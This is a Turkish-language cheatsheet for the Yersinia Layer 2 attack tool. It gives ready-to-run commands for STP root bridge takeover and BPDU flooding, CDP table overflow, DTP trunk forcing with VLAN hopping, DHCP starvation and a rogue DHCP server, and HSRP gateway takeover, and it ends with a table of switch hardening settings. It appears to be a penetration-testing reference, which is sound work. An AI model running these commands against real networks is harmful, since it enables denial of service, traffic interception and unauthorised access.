# Yersinia Bilgi Notu (Cheatsheet)

[Yersinia](https://github.com/tomac/yersinia), Katman 2 (Veri Bağlantı Katmanı - Data Link Layer) protokollerindeki zafiyetleri analiz etmek ve istismar etmek için geliştirilmiş güçlü bir ağ güvenlik test çerçevesidir. STP, CDP, DTP, DHCP, HSRP ve 802.1Q gibi IP katmanının altında çalışan anahtarlama protokollerine yönelik saldırıları simüle eder.

---

## İçindekiler

- [Desteklenen Protokoller & Modlar](#desteklenen-protokoller--modlar)
- [Kurulum](#kurulum)
- [Etkileşimli Curses Modu (`-I`)](#etkileşimli-curses-modu--i)
- [Spanning Tree Protocol (STP) Saldırıları](#spanning-tree-protocol-stp-saldırıları)
- [Cisco Discovery Protocol (CDP) Saldırıları](#cisco-discovery-protocol-cdp-saldırıları)
- [Dynamic Trunking Protocol (DTP) & VLAN Atlama](#dynamic-trunking-protocol-dtp--vlan-atlama)
- [DHCP Tüketme (Starvation) & Sahte Sunucu](#dhcp-tüketme-starvation--sahte-sunucu)
- [HSRP & VRRP Yönlendirici Ele Geçirme](#hsrp--vrrp-yönlendirici-ele-geçirme)
- [Ağ Sertleştirme & Önlemler](#ağ-sertleştirme--önlemler)

---

## Desteklenen Protokoller & Modlar

Yersinia'nın hedef aldığı 2. katman protokolleri:
- **STP:** Spanning Tree Protocol (Root Bridge rolünü ele geçirme, topoloji değişikliği yayma).
- **CDP:** Cisco Discovery Protocol (Sahte komşu cihaz flooding'i, bilgi toplama).
- **DTP:** Dynamic Trunking Protocol (Switch portunu otomatik trunk moduna geçirip tüm VLAN'lara erişme).
- **DHCP:** Dinamik IP protokolü (IP havuzunu tüketme ve sahte DHCP sunucusu kurma).
- **HSRP:** Hot Standby Router Protocol (Sanal ağ geçidinin kontrolünü ele geçirme).
- **802.1Q:** VLAN etiketleme ve çift etiketli atlama (Double Tagging).
- **VTP:** VLAN Trunking Protocol (VLAN veritabanını bozma veya sıfırlama).

Çalışma modları:
- **`-I` (Etkileşimli Curses Modu):** Terminalde ncurses tabanlı tam ekran menü arayüzü (en pratik kullanım).
- **Doğrudan CLI Parametreleri:** Script ve otomasyon süreçleri için tek satırlık komut kipi.

---

## Kurulum

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Yardım menüsünü görüntüleyin
yersinia -h
```

---

## Etkileşimli Curses Modu (`-I`)

GUI gerektirmeden terminal üzerinden görsel ve pratik kontrol:
```bash
sudo yersinia -I
```
- **`h`**: Yardım ve tuş kombinasyonlarını görüntüler.
- **`g`**: Protokoller arasında geçiş yapar (STP, CDP, DTP, DHCP vb.).
- **`x`**: Seçili protokole ait saldırı menüsünü açar.
- **`c`**: Çalışmakta olan saldırıyı durdurur.
- **`l`**: Canlı paket günlüğünü açıp kapatır.
- **`q`**: Programdan çıkar.

---

## Spanning Tree Protocol (STP) Saldırıları

STP mimarisinde en düşük Bridge ID'ye (Öncelik + MAC) sahip switch "Root Bridge" seçilir. Yersinia, önceliği `0` olan sahte BPDU paketleri enjekte ederek kendisini root bridge ilan eder ve tüm ağ trafiğini kendi üzerinden akmaya zorlar.

### 1. Root Bridge Rolünü Ele Geçirme (BPDU Enjeksiyonu)
En düşük öncelikle BPDU göndererek STP kökü olun:
```bash
sudo yersinia stp -attack 1 -i eth0
```

### 2. Topoloji Değişikliği (TCN) Bildirimi Yayma
Tüm switch'lerin CAM tablolarını temizlemesini ve rotaları yeniden hesaplamasını zorlayın:
```bash
sudo yersinia stp -attack 2 -i eth0
```

### 3. STP DoS Saldırısı (BPDU Flooding)
Switch işlemcisini aşırı yükleyerek ağda döngülere (loop) yol açın:
```bash
sudo yersinia stp -attack 0 -i eth0
```

---

## Cisco Discovery Protocol (CDP) Saldırıları

CDP, Cisco cihazların cihaz adı, modeli, işletim sistemi sürümü ve IP adreslerini kimlik doğrulaması olmadan yayınlar.

### 1. Sahte CDP Komşuları Gönderme (Tablo Taşması)
Switch bellek alanını tüketmek ve izleme araçlarını aldatmak için rastgele CDP paketleri yollayın:
```bash
sudo yersinia cdp -attack 0 -i eth0
```

### 2. CDP Bilgi Toplama
`yersinia -I` moduna girip `g` tuşuyla `CDP` protokolünü seçin. Ağdaki anahtarların IP adreslerini, IOS sürümlerini ve Native VLAN numaralarını canlı olarak inceleyin.

---

## Dynamic Trunking Protocol (DTP) & VLAN Atlama

Switch portları `dynamic desirable` veya `dynamic auto` modunda bırakılmışsa, port otomatik olarak trunk moduna çekilebilir.

### 1. Portu Trunk Moduna Zorlama (DTP Desirable Paketi)
Bağlı olunan port ile switch arasında 802.1Q trunk bağlantısı kurun:
```bash
sudo yersinia dtp -attack 0 -i eth0
```

Trunk oluştuktan sonra Linux üzerinde yeni VLAN alt arayüzü tanımlayarak diğer ağlara sızın:
```bash
# Örnek: Yönetim VLAN'ına (VLAN 20) bağlanma
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```

---

## DHCP Tüketme (Starvation) & Sahte Sunucu

### 1. DHCP IP Havuzunu Tüketme (Starvation)
Rastgele sahte MAC adresleriyle binlerce DISCOVER paketi göndererek havuzdaki tüm IP adreslerini rezerve edin:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```

### 2. Sahte DHCP Sunucusu Yayını
Kurban istemcilere saldırganın Gateway ve DNS bilgilerini dağıtın:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```

---

## HSRP & VRRP Yönlendirici Ele Geçirme

HSRP, birden fazla fiziksel yönlendiricinin tek bir sanal IP arkasında yedekli çalışmasını sağlar.

### 1. Aktif Gateway Rolünü Ele Geçirme
Maksimum öncelik değeri (`255`) taşıyan sahte HELLO paketleri göndererek sanal ağ geçidi IP'sini sahiplenin:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```

---

## Ağ Sertleştirme & Önlemler

| Protokol | Saldırı Biçimi | Cisco & Standart Savunma Yöntemi |
|---|---|---|
| **STP** | Sahte Root Bridge | Kullanıcı portlarında `spanning-tree bpduguard enable`, omurga portlarında `spanning-tree rootguard`. |
| **DTP** | Otomatik Trunk Oluşturma | Tüm uç portlarda `switchport mode access` ve `switchport nonegotiate` uygulanmalı. |
| **CDP** | Ağ Haritalama / DoS | Güvenilmeyen portlarda `no cdp enable`, genel olarak `no cdp run`. |
| **DHCP** | Havuz Tüketme & Sahte Sunucu | Anahtarlarda `ip dhcp snooping` etkinleştirilmeli ve rate-limit koyulmalıdır. |
| **HSRP** | Ağ Geçidi Gaspı | HSRP iletişiminde MD5 kimlik doğrulaması (`standby 1 authentication md5`) zorunlu tutulmalıdır. |
